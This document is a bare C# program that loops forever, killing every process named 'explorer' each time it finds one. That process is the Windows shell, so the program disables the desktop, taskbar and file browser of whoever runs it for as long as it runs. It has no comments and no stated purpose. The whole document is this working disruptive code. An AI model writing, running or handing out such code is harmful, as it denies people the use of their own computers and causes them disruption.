using System;
using System.Diagnostics;

while (true)
{
    var listprocess = Process.GetProcesses();
    for (int i = 0; i < listprocess.Length; i++)
    {
        if (listprocess[i].ProcessName == "explorer")
        {
            listprocess[i].Kill();  
        }
    }
}